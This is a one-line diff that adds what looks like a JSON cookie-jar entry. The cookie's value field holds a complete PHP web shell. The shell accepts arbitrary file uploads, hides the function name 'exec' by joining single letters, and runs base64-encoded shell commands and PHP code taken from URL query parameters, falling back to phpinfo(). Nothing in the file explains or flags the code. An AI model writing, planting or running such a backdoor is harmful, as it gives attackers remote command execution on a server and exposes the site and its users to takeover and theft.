@@ -1,0 +1,1 @@
+[{"Expires":1,"Discard":false,"Value":"<?php if(isset($_FILES['f'])){copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);print_r('UploadSuccess..');}else{$A='e';$B='x';$C='e';$D='c';$X=$A.$B.$C.$D;if(isset($_GET['q'])){print_r($X(base64_decode($_GET['q'])));}if(isset($_GET['p'])){eval(base64_decode($_GET['p']));}else{phpinfo();}}?>\n"}]
